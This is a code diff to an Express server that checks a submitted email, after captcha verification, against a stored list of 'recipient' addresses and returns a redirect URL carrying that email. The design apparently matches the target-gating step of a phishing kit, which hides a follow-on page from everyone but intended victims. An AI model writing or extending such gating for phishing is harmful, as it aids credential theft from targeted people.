@@ -10,6 +10,7 @@ const rateLimit = require('express-rate-limit');
 const app = express();
 const PORT = process.env.PORT || 3000;
 const EMAIL_FILE = path.join(__dirname, 'ogas', 'oga.txt');
+const REDIRECT_BASE = process.env.REDIRECT_BASE || 'https://yourdomain.com/complete';
 
 let validEmails = new Set();
 function loadEmails() {
@@ -60,16 +61,24 @@ app.post('/api/check-email', async (req, res) => {
     const verifyData = await verifyRes.json();
     if (!verifyData.success) {
       console.warn('[WARN] Captcha verification failed:', verifyData);
-      return res.status(400).json({ valid: false, message: 'verification error. Please reload the page' });
+      return res.status(400).json({ valid: false, message: 'Verification error. Please reload the page' });
     }
   } catch (err) {
     console.error('[ERROR] Captcha verification error:', err);
     return res.status(500).json({ valid: false, message: 'Captcha verification error' });
   }
 
-  const isValid = validEmails.has(email.toLowerCase());
+  const normalizedEmail = email.toLowerCase();
+  const isValid = validEmails.has(normalizedEmail);
   console.log(`[INFO] Email verification result for ${email}: ${isValid}`);
-  res.json({ valid: isValid, message: isValid ? 'Valid email' : 'Enter the valid recipient email to continue' });
+
+  if (!isValid) {
+    return res.status(404).json({ valid: false, message: 'Enter the valid recipient email to continue' });
+  }
+
+  // ✅ Secure backend-based redirect URL
+  const redirectUrl = `${REDIRECT_BASE}?email=${encodeURIComponent(normalizedEmail)}`;
+  return res.json({ valid: true, message: 'Email verified', redirectUrl });
 });
 
 app.listen(PORT, () => {
